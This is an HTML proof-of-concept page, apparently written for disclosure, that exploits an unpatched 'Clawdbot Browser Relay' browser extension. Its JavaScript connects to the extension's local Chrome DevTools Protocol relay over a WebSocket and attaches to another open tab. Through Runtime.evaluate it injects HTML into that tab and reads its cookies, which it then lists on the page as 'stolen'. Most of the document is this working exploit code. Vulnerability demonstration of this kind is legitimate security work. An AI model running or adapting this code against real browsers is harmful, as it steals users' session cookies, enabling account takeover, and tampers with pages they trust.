
  <!DOCTYPE html>
  <html data-bs-theme="dark">
  <head>
    <title>Clawdbot CDP Vulnerability PoC</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
  crossorigin="anonymous">
  </head>
  <body>
    <div class="container py-4">
      
      <img src="./title.png" alt="Clawdbot Stealer" />

      <h1>Abuse Clawdbot to steal session credentials</h1>
      
      <h2>Overview</h2>
      <p>If a user has an unpatched version of the Clawdbot browser extension enabled, you can use this POC to steal authentication cookies from other browser tabs.</p>
      
      <h2>Setup</h2>

      <ul>
        <li>Completely close Chrome</li>
        <li>Start a new Chrome session with only two tabs</li>
        <li>In the first tab, load this page.  <storng>Ensure that you're using the insecure http version</storng></li>
        <li>In the second tab, load the page of your choice.</li>
        <li>"Clawdbot Browser Relay" extension must be installed and active -- "Clawdbot Browser Relay started debugging this browser" should be visible at the top of both pages
          <p style="padding: 15px;"><img style="width: 85%;" src="./plugin_screenshot.png" alt="Screenshot of clawdbot browser relay plugin when activated" /></p>
        </li>
        <li>Click "Run PoC" on this page</li>
        <li>If your clawdbot is vulnerable: 
          <ul>
            <li>Observe cookies stolen from other tab visible in this tab</li>
            <li>
                Notice malicious content injected
                <p style="padding: 15px;"><img src="./malicious_content.png" alt="malicious content injected into other browser tab" /></p>
            </li>
          </ul>
        </li>
      </ul>

  
      <p>
        <button class="btn btn-primary" id="connect">Run PoC</button>
      </p>

      <div id="status-section" style="display:none;">
        <h2>Status</h2>
        <ul id="status-log" class="list-group mb-3"></ul>
      </div>

      <div id="result-section" style="display:none;">
        <h2>Result</h2>
        <h3>Target</h3>
        <p>Malicious content injected + authentication cookies stolen from <code id="location"></code></p>

        <h3>Stolen Cookies</h3>
        <p class="text-muted" id="cookies"></p>
      </div>

      <div id="error-section" class="alert alert-danger" style="display:none;">
        <strong>Error:</strong> <span id="error-message"></span>
      </div>

      <h2 class="mt-4" style="display:none;">Detail Log</h2>
      <pre id="output" class="bg-light p-3" style="display: none; max-height:300px;overflow:auto;"></pre>
    </div>

    <script>
      const output = document.getElementById('output');
      const statusLog = document.getElementById('status-log');
      const statusSection = document.getElementById('status-section');
      const resultSection = document.getElementById('result-section');
      const errorSection = document.getElementById('error-section');
      const locationDiv = document.getElementById('location');
      const cookiesSection = document.getElementById('cookies');

      function log(msg) {
        output.textContent += msg + '\n';
        output.scrollTop = output.scrollHeight;
        console.log(msg);
      }

      function status(msg, type = 'info') {
        statusSection.style.display = 'block';
        const li = document.createElement('li');
        li.className = `list-group-item list-group-item-${type}`;
        li.textContent = msg;
        statusLog.appendChild(li);
      }

      function showError(msg) {
        errorSection.style.display = 'block';
        document.getElementById('error-message').textContent = msg;
      }

      document.getElementById('connect').onclick = async () => {
        // Reset UI
        output.textContent = '';
        statusLog.innerHTML = '';
        statusSection.style.display = 'none';
        resultSection.style.display = 'none';
        errorSection.style.display = 'none';
        //screenshotImg.src = '';

        status('Connecting to CDP relay on localhost:18792...', 'warning');

        const ws = new WebSocket('ws://127.0.0.1:18792/cdp');
        let messageId = 1;
        let sessionId = null;
        let targetUrl = null;

        ws.onopen = () => {
          log('Connected to CDP relay');
          status('Connected to CDP relay', 'success');
          status('Requesting list of attached targets...', 'warning');

          ws.send(JSON.stringify({
            id: messageId++,
            method: 'Target.getTargets'
          }));
        };

        ws.onmessage = async (event) => {
          const msg = JSON.parse(event.data);
          log('Received: ' + JSON.stringify(msg, null, 2) + '\n');

          // Step 1: got targets
          if (msg.id === 1) {
            if (!msg.result?.targetInfos?.length) {
              status('No attached targets found', 'danger');
              showError('No tabs are attached to the extension. Attach a tab first.');
              ws.close();
              return;
            }

            const targetId = msg.result.targetInfos[0].targetId;
            targetUrl = msg.result.targetInfos[0].url;

            status(`Found attached tab: ${targetUrl}`, 'success');
            status('Attaching to target...', 'warning');

            ws.send(JSON.stringify({
              id: messageId++,
              method: 'Target.attachToTarget',
              params: { targetId }
            }));
          }

          // Step 2: got sessionId ask for href
          if (msg.id === 2 && msg.result?.sessionId) {
            sessionId = msg.result.sessionId;
            status('Attached to target', 'success');
            status('Running javascript in target page via Runtime.evaluate...', 'warning');

            ws.send(JSON.stringify({
              id: messageId++,
              method: 'Runtime.evaluate',
              sessionId: sessionId,
              params: {
                expression: `
              // Source - https://stackoverflow.com/a
              // Posted by KoalaBear
              // Retrieved 2026-01-29, License - CC BY-SA 4.0

              if (window.trustedTypes && window.trustedTypes.createPolicy && !window.trustedTypes.defaultPolicy) {
                  window.trustedTypes.createPolicy('default', {
                      createHTML: string => string
                      // Optional, only needed for script (url) tags
                      //,createScriptURL: string => string
                      //,createScript: string => string,
                  });
              }

                document.body.innerHTML = "<h1>Malicious content has been injected into this tab.</h1>" + document.body.innerHTML;
                x={"href": document.location.href, "cookies": document.cookie}; x`,
                returnByValue: true
              }
            }));
          }


          // Step 3: got URL, now take screenshot
          if (msg.id === 3 && msg.result) {
            console.log(msg.result);
            const cookiesStr = msg.result.result?.value?.cookies;
            targetUrl = msg.result.result?.value?.href;
            locationDiv.textContent = targetUrl;

            const cookies = cookiesStr
              .split('|')
              .flatMap(segment => segment.split(/;\s*/))
              .filter(Boolean)
              .reduce((acc, pair) => {
                const [key, ...rest] = pair.split('=');
                if (key) acc[key.trim()] = rest.join('=');
                return acc;
              }, {});

            console.log(cookies);
            status(`URL of target tab: ${targetUrl}`, 'success');
            status('Injected malicious content', 'warning');
            status(Object.values(cookies).length + ' cookies stolen');

            ws.close();

            cookiesSection.innerHTML = "<ul>";

            for (const [key, value] of Object.entries(cookies)) {
              console.log(`${key}: ${value}`);
              cookiesSection.innerHTML += '<li><code>' + key + '=' + value + '</code></li>'
            }


            cookiesSection.innerHTML += "</ul>";
            
            resultSection.style.display = 'block';

            console.log("snapshot");

            // try {
            //   const response = await fetch('/snapshot', {
            //     method: 'POST',
            //     headers: { 'Content-Type': 'application/json' },
            //     body: JSON.stringify({
            //       url: targetUrl,
            //       cookies: cookies
            //     })
            //   });

            //   if (!response.ok) {
            //     throw new Error(`Screenshot failed: ${response.status}`);
            //   }

            //   const blob = await response.blob();
            //   screenshotImg.src = URL.createObjectURL(blob);
            //   resultSection.style.display = 'block';

            //   status('Screenshot captured', 'success');
              status('PoC complete â€” demonstrated cross-origin CDP access', 'primary');

            // } catch (err) {
            //   status(`Screenshot failed: ${err.message}`, 'danger');
            //   showError(err.message);
            // }
          }
        };

        ws.onerror = () => {
          status('WebSocket connection failed', 'danger');
          showError('Could not connect to CDP relay. Is the gateway running?');
          log('WebSocket error');
        };

        ws.onclose = () => {
          log('WebSocket closed');
        };
      };
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"
  crossorigin="anonymous"></script>
  </body>
  </html>